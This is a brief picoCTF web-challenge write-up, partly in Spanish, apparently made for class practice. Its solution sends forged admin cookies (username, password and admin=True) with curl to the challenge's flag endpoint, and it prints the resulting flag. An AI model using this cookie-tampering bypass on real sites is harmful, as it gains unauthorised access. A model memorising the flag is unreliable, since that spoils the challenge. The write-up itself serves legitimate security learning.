
Descripcion:
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573.

Solucion(s):
eduar-picoctf@webshell:~$ curl -X GET https://jupiter.challenges.picoctf.org/problem/44573/flag -H 
"Cookie: username=admin; password=admin; admin=True" | grep pico

picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}

Notas:
Inspeccionamos la pagina dada y nos vamos al apartado de Network, estando hay actualizamos las pagina para ver las cookies que implementa la pagina. 

sacamos el enlace al cual hace la referencia la flag y con el comando "curl"
obtenemos una coneccion para cambiar la conbiar la contrasenia el usuario y el estado de validacion.

Referencias:
Observaciones hechas en clase.